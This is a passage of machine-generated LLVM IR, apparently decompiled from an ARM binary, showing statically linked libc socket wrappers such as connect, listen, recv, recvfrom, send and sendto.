  %v0_11970 = load i32, i32* %r2.global-to-local, align 4
  %v1_11970 = sub i32 0, %v0_11970
  store i32 %v1_11970, i32* %r2.global-to-local, align 4
  %v3_11974 = add i32 %v4_1196c, %v0_11968
  %v4_11974 = inttoptr i32 %v3_11974 to i32*
  store i32 %v1_11970, i32* %v4_11974, align 4
  %v2_1197c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1197c

dec_label_pc_1197c:                               ; preds = %entry, %dec_label_pc_11964
  %v1_11980 = phi i32 [ %v0_11954, %entry ], [ -1, %dec_label_pc_11964 ]
  %v2_1197c = phi i32 [ %v3_11948, %entry ], [ %v2_1197c.pre, %dec_label_pc_11964 ]
  store i32 %v2_1197c, i32* @r7, align 4
  ret i32 %v1_11980

; uselistorder directives
  uselistorder i32 %v0_11954, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1197c, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11984:
  %v0_11984 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11984, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11984
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_11984 = load i32, i32* @fp, align 4
  %v8_11984 = shl i32 %v2_11984, %tmp
  %v9_11984 = and i32 %v8_11984, %arg1
  store i32 %v9_11984, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11984, %bb
  %v8_11988 = phi i32 [ %arg1, %dec_label_pc_11984 ], [ %v9_11984, %bb ]
  ret i32 %v8_11988

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11990 = load i32, i32* @r4, align 4
  store i32 %v3_11990, i32* %stack_var_-20, align 4
  %v6_11990 = load i32, i32* @r5, align 4
  %v9_11990 = load i32, i32* @r6, align 4
  %v12_11990 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r3, align 4
  %v4_1199c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  store i32 %v4_1199c, i32* @ip, align 4
  %v2_119a0 = icmp eq i32 %v4_1199c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_119a0, label %dec_label_pc_119b8, label %entry.dec_label_pc_119c4_crit_edge

entry.dec_label_pc_119c4_crit_edge:               ; preds = %entry
  br label %dec_label_pc_119c4

dec_label_pc_119b8:                               ; preds = %entry
  store i32 %v3_11990, i32* @r4, align 4
  store i32 %v9_11990, i32* @r6, align 4
  store i32 %v12_11990, i32* @r7, align 4
  %v0_119c0 = call i32 @__sys_connect()
  br label %dec_label_pc_119c4

dec_label_pc_119c4:                               ; preds = %entry.dec_label_pc_119c4_crit_edge, %dec_label_pc_119b8
  %v0_119c4 = call i32 @__libc_enable_asynccancel()
  %v0_119c8 = load i32, i32* @r6, align 4
  store i32 %v0_119c8, i32* @r1, align 4
  store i32 %v0_119c4, i32* @r5, align 4
  %v0_119d4 = load i32, i32* @r4, align 4
  store i32 %v0_119d4, i32* @r0, align 4
  %v0_119d8 = call i32 @__sys_connect()
  store i32 %v0_119d8, i32* @r4, align 4
  %v0_119e0 = load i32, i32* @r5, align 4
  %v1_119e4 = call i32 @__libc_disable_asynccancel(i32 %v0_119e0)
  %v0_119e8 = load i32, i32* @r4, align 4
  %v2_119f0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_119f0, i32* @r4, align 4
  store i32 %v6_11990, i32* @r5, align 4
  store i32 %v9_11990, i32* @r6, align 4
  store i32 %v12_11990, i32* @r7, align 4
  ret i32 %v0_119e8

; uselistorder directives
  uselistorder label %dec_label_pc_119c4, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11a00 = load i32, i32* @r7, align 4
  store i32 %v3_11a00, i32* %stack_var_-8, align 4
  %v0_11a0c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11a0c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11a0c, -4095
  br i1 %tmp, label %dec_label_pc_11a34, label %dec_label_pc_11a1c

dec_label_pc_11a1c:                               ; preds = %entry
  %v0_11a20 = call i32 @__aeabi_read_tp()
  %v3_11a24 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11a24 = sext i16 %v3_11a24 to i32
  %v0_11a28 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a28 = sub i32 0, %v0_11a28
  store i32 %v1_11a28, i32* %r2.global-to-local, align 4
  %v3_11a2c = add i32 %v4_11a24, %v0_11a20
  %v4_11a2c = inttoptr i32 %v3_11a2c to i32*
  store i32 %v1_11a28, i32* %v4_11a2c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11a34.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11a34

dec_label_pc_11a34:                               ; preds = %entry, %dec_label_pc_11a1c
  %v1_11a38 = phi i32 [ %v0_11a0c, %entry ], [ -1, %dec_label_pc_11a1c ]
  %v2_11a34 = phi i32 [ %v3_11a00, %entry ], [ %v2_11a34.pre, %dec_label_pc_11a1c ]
  store i32 %v2_11a34, i32* @r7, align 4
  ret i32 %v1_11a38

; uselistorder directives
  uselistorder i32 %v0_11a0c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a34, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11a3c:
  %v0_11a3c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a3c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a3c
  %v2_11a40 = load i32, i32* @ip, align 4
  %v8_11a40 = lshr i32 %v2_11a40, %arg3
  %v9_11a40 = and i32 %v8_11a40, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a3c, %bb
  %v10_11a40 = phi i32 [ %arg1, %dec_label_pc_11a3c ], [ %v9_11a40, %bb ]
  ret i32 %v10_11a40

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11a44 = load i32, i32* @r4, align 4
  store i32 %v3_11a44, i32* %stack_var_-12, align 4
  %v0_11a54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11a54, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11a54, -4095
  br i1 %tmp, label %dec_label_pc_11a7c, label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %entry
  %v0_11a68 = call i32 @__aeabi_read_tp()
  %v3_11a6c = load i16, i16* @global_var_21d68.334, align 2
  %v4_11a6c = sext i16 %v3_11a6c to i32
  %v0_11a70 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a70 = sub i32 0, %v0_11a70
  store i32 %v1_11a70, i32* %r2.global-to-local, align 4
  %v3_11a74 = add i32 %v4_11a6c, %v0_11a68
  %v4_11a74 = inttoptr i32 %v3_11a74 to i32*
  store i32 %v1_11a70, i32* %v4_11a74, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11a7c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11a7c

dec_label_pc_11a7c:                               ; preds = %entry, %dec_label_pc_11a64
  %v1_11a80 = phi i32 [ %v0_11a54, %entry ], [ -1, %dec_label_pc_11a64 ]
  %v2_11a7c = phi i32 [ %v3_11a44, %entry ], [ %v2_11a7c.pre, %dec_label_pc_11a64 ]
  store i32 %v2_11a7c, i32* @r4, align 4
  ret i32 %v1_11a80

; uselistorder directives
  uselistorder i32 %v0_11a54, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a7c, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11a84:
  %v0_11a84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11a84, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11a84
  %v2_11a84 = load i32, i32* @r7, align 4
  %v5_11a84 = udiv i32 %v2_11a84, 4
  %v6_11a84 = and i32 %v5_11a84, %arg1
  store i32 %v6_11a84, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11a84, %bb
  %v8_11a88 = phi i32 [ %arg1, %dec_label_pc_11a84 ], [ %v6_11a84, %bb ]
  ret i32 %v8_11a88

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11a8c = load i32, i32* @r7, align 4
  store i32 %v3_11a8c, i32* %stack_var_-8, align 4
  %v0_11a98 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11a98, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11a98, -4095
  br i1 %tmp, label %dec_label_pc_11ac0, label %dec_label_pc_11aa8

dec_label_pc_11aa8:                               ; preds = %entry
  %v0_11aac = call i32 @__aeabi_read_tp()
  %v3_11ab0 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11ab0 = sext i16 %v3_11ab0 to i32
  %v0_11ab4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ab4 = sub i32 0, %v0_11ab4
  store i32 %v1_11ab4, i32* %r2.global-to-local, align 4
  %v3_11ab8 = add i32 %v4_11ab0, %v0_11aac
  %v4_11ab8 = inttoptr i32 %v3_11ab8 to i32*
  store i32 %v1_11ab4, i32* %v4_11ab8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11ac0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11ac0

dec_label_pc_11ac0:                               ; preds = %entry, %dec_label_pc_11aa8
  %v1_11ac4 = phi i32 [ %v0_11a98, %entry ], [ -1, %dec_label_pc_11aa8 ]
  %v2_11ac0 = phi i32 [ %v3_11a8c, %entry ], [ %v2_11ac0.pre, %dec_label_pc_11aa8 ]
  store i32 %v2_11ac0, i32* @r7, align 4
  ret i32 %v1_11ac4

; uselistorder directives
  uselistorder i32 %v0_11a98, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ac0, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11acc = load i32, i32* @r7, align 4
  store i32 %v3_11acc, i32* %stack_var_-8, align 4
  %v0_11ad8 = load i32, i32* @r0, align 4
  store i32 %v0_11ad8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11ad8, -4095
  br i1 %tmp, label %dec_label_pc_11b00, label %dec_label_pc_11ae8

dec_label_pc_11ae8:                               ; preds = %entry
  %v0_11aec = call i32 @__aeabi_read_tp()
  %v3_11af0 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11af0 = sext i16 %v3_11af0 to i32
  %v0_11af4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11af4 = sub i32 0, %v0_11af4
  store i32 %v1_11af4, i32* %r2.global-to-local, align 4
  %v3_11af8 = add i32 %v4_11af0, %v0_11aec
  %v4_11af8 = inttoptr i32 %v3_11af8 to i32*
  store i32 %v1_11af4, i32* %v4_11af8, align 4
  %v2_11b00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11b00

dec_label_pc_11b00:                               ; preds = %entry, %dec_label_pc_11ae8
  %v1_11b04 = phi i32 [ %v0_11ad8, %entry ], [ -1, %dec_label_pc_11ae8 ]
  %v2_11b00 = phi i32 [ %v3_11acc, %entry ], [ %v2_11b00.pre, %dec_label_pc_11ae8 ]
  store i32 %v2_11b00, i32* @r7, align 4
  ret i32 %v1_11b04

; uselistorder directives
  uselistorder i32 %v0_11ad8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11b00, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11b08:
  %v0_11b08 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11b08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11b08
  %v5_11b08 = udiv i32 %arg4, 4
  %v6_11b08 = and i32 %v5_11b08, %arg1
  %v4_11b0c = lshr i32 %v6_11b08, %arg3
  %v5_11b0c = sub i32 32, %arg3
  %v6_11b0c = shl i32 %v6_11b08, %v5_11b0c
  %v7_11b0c = or i32 %v6_11b0c, %v4_11b0c
  %v9_11b0c = and i32 %v7_11b0c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11b08, %bb
  %v10_11b0c = phi i32 [ %arg1, %dec_label_pc_11b08 ], [ %v9_11b0c, %bb ]
  ret i32 %v10_11b0c

; uselistorder directives
  uselistorder i32 %v6_11b08, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11b14 = load i32, i32* @r4, align 4
  store i32 %v3_11b14, i32* %stack_var_-24, align 4
  %v6_11b14 = load i32, i32* @r5, align 4
  %v9_11b14 = load i32, i32* @r6, align 4
  %v12_11b14 = load i32, i32* @r7, align 4
  %v15_11b14 = load i32, i32* @r8, align 4
  %v18_11b14 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @ip, align 4
  %v4_11b20 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  %v2_11b24 = icmp eq i32 %v4_11b20, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11b24, label %dec_label_pc_11b3c, label %entry.dec_label_pc_11b44_crit_edge

entry.dec_label_pc_11b44_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11b44

dec_label_pc_11b3c:                               ; preds = %entry
  store i32 %v3_11b14, i32* @r4, align 4
  store i32 %v9_11b14, i32* @r6, align 4
  store i32 %v12_11b14, i32* @r7, align 4
  store i32 %v15_11b14, i32* @r8, align 4
  %v0_11b40 = call i32 @__sys_recv()
  br label %dec_label_pc_11b44

dec_label_pc_11b44:                               ; preds = %entry.dec_label_pc_11b44_crit_edge, %dec_label_pc_11b3c
  %v0_11b44 = call i32 @__libc_enable_asynccancel()
  %v0_11b48 = load i32, i32* @r6, align 4
  store i32 %v0_11b48, i32* @r1, align 4
  store i32 %v0_11b44, i32* @r5, align 4
  %v0_11b58 = load i32, i32* @r4, align 4
  store i32 %v0_11b58, i32* @r0, align 4
  %v0_11b5c = call i32 @__sys_recv()
  store i32 %v0_11b5c, i32* @r4, align 4
  %v0_11b64 = load i32, i32* @r5, align 4
  %v1_11b68 = call i32 @__libc_disable_asynccancel(i32 %v0_11b64)
  %v0_11b6c = load i32, i32* @r4, align 4
  %v2_11b70 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11b70, i32* @r4, align 4
  store i32 %v6_11b14, i32* @r5, align 4
  store i32 %v9_11b14, i32* @r6, align 4
  store i32 %v12_11b14, i32* @r7, align 4
  store i32 %v15_11b14, i32* @r8, align 4
  store i32 %v18_11b14, i32* @lr, align 4
  ret i32 %v0_11b6c

; uselistorder directives
  uselistorder label %dec_label_pc_11b44, { 1, 0 }
}

define i32 @__sys_recvfrom() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11b80 = load i32, i32* @r4, align 4
  store i32 %v3_11b80, i32* %stack_var_-16, align 4
  %v0_11b94 = load i32, i32* @r0, align 4
  store i32 %v0_11b94, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11b94, -4095
  br i1 %tmp, label %dec_label_pc_11bbc, label %dec_label_pc_11ba4

dec_label_pc_11ba4:                               ; preds = %entry
  %v0_11ba8 = call i32 @__aeabi_read_tp()
  %v3_11bac = load i16, i16* @global_var_21d68.334, align 2
  %v4_11bac = sext i16 %v3_11bac to i32
  %v0_11bb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_11bb0 = sub i32 0, %v0_11bb0
  store i32 %v1_11bb0, i32* %r2.global-to-local, align 4
  %v3_11bb4 = add i32 %v4_11bac, %v0_11ba8
  %v4_11bb4 = inttoptr i32 %v3_11bb4 to i32*
  store i32 %v1_11bb0, i32* %v4_11bb4, align 4
  %v2_11bbc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11bbc

dec_label_pc_11bbc:                               ; preds = %entry, %dec_label_pc_11ba4
  %v1_11bc0 = phi i32 [ %v0_11b94, %entry ], [ -1, %dec_label_pc_11ba4 ]
  %v2_11bbc = phi i32 [ %v3_11b80, %entry ], [ %v2_11bbc.pre, %dec_label_pc_11ba4 ]
  store i32 %v2_11bbc, i32* @r4, align 4
  ret i32 %v1_11bc0

; uselistorder directives
  uselistorder i32 %v0_11b94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11bbc, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11bc8 = load i32, i32* @r4, align 4
  store i32 %v3_11bc8, i32* %stack_var_-32, align 4
  %v6_11bc8 = load i32, i32* @r5, align 4
  %v9_11bc8 = load i32, i32* @r6, align 4
  %v12_11bc8 = load i32, i32* @r7, align 4
  %v15_11bc8 = load i32, i32* @r8, align 4
  %v18_11bc8 = load i32, i32* @sb, align 4
  %v21_11bc8 = load i32, i32* @sl, align 4
  %v24_11bc8 = load i32, i32* @lr, align 4
  %v4_11bd8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  %v2_11be0 = icmp eq i32 %v4_11bd8, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_11be0, label %dec_label_pc_11c00, label %dec_label_pc_11c0c

dec_label_pc_11c00:                               ; preds = %entry
  store i32 %v3_11bc8, i32* @r4, align 4
  store i32 %v12_11bc8, i32* @r7, align 4
  store i32 %v15_11bc8, i32* @r8, align 4
  store i32 %v18_11bc8, i32* %sb.global-to-local, align 4
  %v0_11c08 = call i32 @__sys_recvfrom()
  br label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %entry, %dec_label_pc_11c00
  %v0_11c0c = call i32 @__libc_enable_asynccancel()
  %v0_11c10 = load i32, i32* @r7, align 4
  store i32 %v0_11c10, i32* @r1, align 4
  store i32 %v0_11c0c, i32* @r5, align 4
  %v0_11c20 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_11c20, i32* @r0, align 4
  %v0_11c28 = call i32 @__sys_recvfrom()
  store i32 %v0_11c28, i32* @r4, align 4
  %v0_11c30 = load i32, i32* @r5, align 4
  %v1_11c34 = call i32 @__libc_disable_asynccancel(i32 %v0_11c30)
  %v0_11c38 = load i32, i32* @r4, align 4
  %v2_11c40 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11c40, i32* @r4, align 4
  store i32 %v6_11bc8, i32* @r5, align 4
  store i32 %v9_11bc8, i32* @r6, align 4
  store i32 %v12_11bc8, i32* @r7, align 4
  store i32 %v15_11bc8, i32* @r8, align 4
  store i32 %v18_11bc8, i32* @sb, align 4
  store i32 %v21_11bc8, i32* @sl, align 4
  store i32 %v24_11bc8, i32* @lr, align 4
  ret i32 %v0_11c38

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11c0c, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11c50 = load i32, i32* @r7, align 4
  store i32 %v3_11c50, i32* %stack_var_-8, align 4
  %v0_11c5c = load i32, i32* @r0, align 4
  store i32 %v0_11c5c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11c5c, -4095
  br i1 %tmp, label %dec_label_pc_11c84, label %dec_label_pc_11c6c

dec_label_pc_11c6c:                               ; preds = %entry
  %v0_11c70 = call i32 @__aeabi_read_tp()
  %v3_11c74 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11c74 = sext i16 %v3_11c74 to i32
  store i32 %v4_11c74, i32* @r3, align 4
  %v0_11c78 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c78 = sub i32 0, %v0_11c78
  store i32 %v1_11c78, i32* %r2.global-to-local, align 4
  %v3_11c7c = add i32 %v4_11c74, %v0_11c70
  %v4_11c7c = inttoptr i32 %v3_11c7c to i32*
  store i32 %v1_11c78, i32* %v4_11c7c, align 4
  %v2_11c84.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11c84

dec_label_pc_11c84:                               ; preds = %entry, %dec_label_pc_11c6c
  %v1_11c88 = phi i32 [ %v0_11c5c, %entry ], [ -1, %dec_label_pc_11c6c ]
  %v2_11c84 = phi i32 [ %v3_11c50, %entry ], [ %v2_11c84.pre, %dec_label_pc_11c6c ]
  store i32 %v2_11c84, i32* @r7, align 4
  ret i32 %v1_11c88

; uselistorder directives
  uselistorder i32 %v0_11c5c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11c84, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11c8c:
  %v0_11c8c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11c8c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11c8c
  %v2_11c90 = load i32, i32* @ip, align 4
  %v3_11c90 = udiv i32 %v2_11c90, 2
  %v4_11c90 = shl i32 %v2_11c90, 31
  %v5_11c90 = or i32 %v3_11c90, %v4_11c90
  %v8_11c90 = and i32 %v5_11c90, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11c8c, %bb
  %v9_11c90 = phi i32 [ %arg1, %dec_label_pc_11c8c ], [ %v8_11c90, %bb ]
  ret i32 %v9_11c90

; uselistorder directives
  uselistorder i32 %v2_11c90, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11c98 = load i32, i32* @r4, align 4
  store i32 %v3_11c98, i32* %stack_var_-24, align 4
  %v6_11c98 = load i32, i32* @r5, align 4
  %v9_11c98 = load i32, i32* @r6, align 4
  %v12_11c98 = load i32, i32* @r7, align 4
  %v15_11c98 = load i32, i32* @r8, align 4
  %v18_11c98 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @ip, align 4
  %v4_11ca4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  %v2_11ca8 = icmp eq i32 %v4_11ca4, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_11ca8, label %dec_label_pc_11cc0, label %entry.dec_label_pc_11cc8_crit_edge

entry.dec_label_pc_11cc8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11cc8

dec_label_pc_11cc0:                               ; preds = %entry
  store i32 %v3_11c98, i32* @r4, align 4
  store i32 %v9_11c98, i32* @r6, align 4
  store i32 %v12_11c98, i32* @r7, align 4
  store i32 %v15_11c98, i32* @r8, align 4
  %v0_11cc4 = call i32 @__sys_send()
  br label %dec_label_pc_11cc8

dec_label_pc_11cc8:                               ; preds = %entry.dec_label_pc_11cc8_crit_edge, %dec_label_pc_11cc0
  %v0_11cc8 = call i32 @__libc_enable_asynccancel()
  %v0_11ccc = load i32, i32* @r6, align 4
  store i32 %v0_11ccc, i32* @r1, align 4
  store i32 %v0_11cc8, i32* @r5, align 4
  %v0_11cd8 = load i32, i32* @r8, align 4
  store i32 %v0_11cd8, i32* @r3, align 4
  %v0_11cdc = load i32, i32* @r4, align 4
  store i32 %v0_11cdc, i32* @r0, align 4
  %v0_11ce0 = call i32 @__sys_send()
  store i32 %v0_11ce0, i32* @r4, align 4
  %v0_11ce8 = load i32, i32* @r5, align 4
  %v1_11cec = call i32 @__libc_disable_asynccancel(i32 %v0_11ce8)
  %v0_11cf0 = load i32, i32* @r4, align 4
  %v2_11cf4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11cf4, i32* @r4, align 4
  store i32 %v6_11c98, i32* @r5, align 4
  store i32 %v9_11c98, i32* @r6, align 4
  store i32 %v12_11c98, i32* @r7, align 4
  store i32 %v15_11c98, i32* @r8, align 4
  store i32 %v18_11c98, i32* @lr, align 4
  ret i32 %v0_11cf0

; uselistorder directives
  uselistorder label %dec_label_pc_11cc8, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11d04 = load i32, i32* @r4, align 4
  store i32 %v3_11d04, i32* %stack_var_-16, align 4
  %v0_11d18 = load i32, i32* @r0, align 4
  store i32 %v0_11d18, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11d18, -4095
  br i1 %tmp, label %dec_label_pc_11d40, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %entry
  %v0_11d2c = call i32 @__aeabi_read_tp()
  %v3_11d30 = load i16, i16* @global_var_21d68.334, align 2
  %v4_11d30 = sext i16 %v3_11d30 to i32
  %v0_11d34 = load i32, i32* %r2.global-to-local, align 4
  %v1_11d34 = sub i32 0, %v0_11d34
  store i32 %v1_11d34, i32* %r2.global-to-local, align 4
  %v3_11d38 = add i32 %v4_11d30, %v0_11d2c
  %v4_11d38 = inttoptr i32 %v3_11d38 to i32*
  store i32 %v1_11d34, i32* %v4_11d38, align 4
  %v2_11d40.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11d40

dec_label_pc_11d40:                               ; preds = %entry, %dec_label_pc_11d28
  %v1_11d44 = phi i32 [ %v0_11d18, %entry ], [ -1, %dec_label_pc_11d28 ]
  %v2_11d40 = phi i32 [ %v3_11d04, %entry ], [ %v2_11d40.pre, %dec_label_pc_11d28 ]
  store i32 %v2_11d40, i32* @r4, align 4
  ret i32 %v1_11d44

; uselistorder directives
  uselistorder i32 %v0_11d18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d40, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11d48:
  %v0_11d48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d48, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11d48
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11d48, %bb
  %v10_11d4c = phi i32 [ %arg1, %dec_label_pc_11d48 ], [ 0, %bb ]
  ret i32 %v10_11d4c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11d50 = load i32, i32* @r4, align 4
  store i32 %v3_11d50, i32* %stack_var_-32, align 4
  %v6_11d50 = load i32, i32* @r5, align 4
  %v9_11d50 = load i32, i32* @r6, align 4
  %v12_11d50 = load i32, i32* @r7, align 4
  %v15_11d50 = load i32, i32* @r8, align 4
  %v18_11d50 = load i32, i32* @sb, align 4
  %v21_11d50 = load i32, i32* @sl, align 4
  %v24_11d50 = load i32, i32* @lr, align 4
  %v4_11d60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 12784) to i32*), align 4
  %v2_11d68 = icmp eq i32 %v4_11d60, 0
